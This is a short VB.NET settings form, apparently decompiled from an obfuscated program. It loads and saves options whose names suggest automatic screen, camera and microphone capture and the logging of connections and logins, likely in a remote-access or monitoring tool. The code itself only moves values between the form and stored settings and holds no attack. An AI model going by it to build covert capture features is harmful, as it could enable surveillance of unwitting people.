Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Public Class STNG

    Private Sub STNG_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.SCAUT.Checked = Class7.class8_0.bool_6
        Me.SCI.SelectedIndex = Conversions.ToInteger(Class7.class8_0.string_0)
        Me.CAMAUT.Checked = Class7.class8_0.bool_7
        Me.CAMI.SelectedIndex = Class7.class8_0.int_0
        Me.MICAUT.Checked = Class7.class8_0.bool_8
        Me.LOGCONNECTIONS.Checked = Class7.class8_0.bool_2
        Me.LOGLERR.Checked = Class7.class8_0.bool_3
        Me.LOGRERR.Checked = Class7.class8_0.bool_4
        Me.LOGMSGS.Checked = Class7.class8_0.bool_5
        Me.LOGLOGIN.Checked = Class7.class8_0.bool_1
        Me.ShowAlert.Checked = Class7.class8_0.bool_0
        Me.MICI.SelectedIndex = Class7.class8_0.int_1
        Me.scrI.SelectedIndex = Class7.class8_0.int_2
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Class7.class8_0.bool_6 = Me.SCAUT.Checked
        Class7.class8_0.string_0 = Conversions.ToString(Me.SCI.SelectedIndex)
        Class7.class8_0.bool_7 = Me.CAMAUT.Checked
        Class7.class8_0.int_0 = Me.CAMI.SelectedIndex
        Class7.class8_0.bool_8 = Me.MICAUT.Checked
        Class7.class8_0.bool_2 = Me.LOGCONNECTIONS.Checked
        Class7.class8_0.bool_3 = Me.LOGLERR.Checked
        Class7.class8_0.bool_4 = Me.LOGRERR.Checked
        Class7.class8_0.bool_5 = Me.LOGMSGS.Checked
        Class7.class8_0.bool_1 = Me.LOGLOGIN.Checked
        Class7.class8_0.bool_0 = Me.ShowAlert.Checked
        Class7.class8_0.int_1 = Me.MICI.SelectedIndex
        Class7.class8_0.int_2 = Me.scrI.SelectedIndex
        Class7.class8_0.method_1()
        Me.Close()
    End Sub
End Class